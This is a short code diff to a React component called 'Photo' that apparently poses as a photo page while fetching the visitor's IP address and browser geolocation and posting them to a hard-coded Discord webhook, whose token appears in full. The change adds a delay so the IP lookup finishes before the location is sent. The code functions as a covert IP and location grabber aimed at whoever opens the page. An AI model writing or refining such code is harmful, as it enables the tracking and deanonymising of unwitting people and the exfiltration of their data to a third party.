@@ -4,7 +4,7 @@ export default function Photo() {
   const [step, setStep] = useState('loading');
   const [ip, setIp] = useState('unknown');
 
-  const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y'; 
+  const WEBHOOK = 'https://discord.com/api/webhooks/1567022561219579977/Q_PoAILBosmbMaPOFDZ_NKV3isYOjkrdhk4BNndrVCR-riiX2Pr_IVmDDGBhKUV54e5Y';
 
   useEffect(() => {
     fetch('https://api.ipify.org?format=json')
@@ -15,7 +15,10 @@ export default function Photo() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          // Wait 500ms so the IP fetch finishes before sending
+          setTimeout(() => {
+            sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          }, 500);
         },
         (err) => {
           setStep('failed');
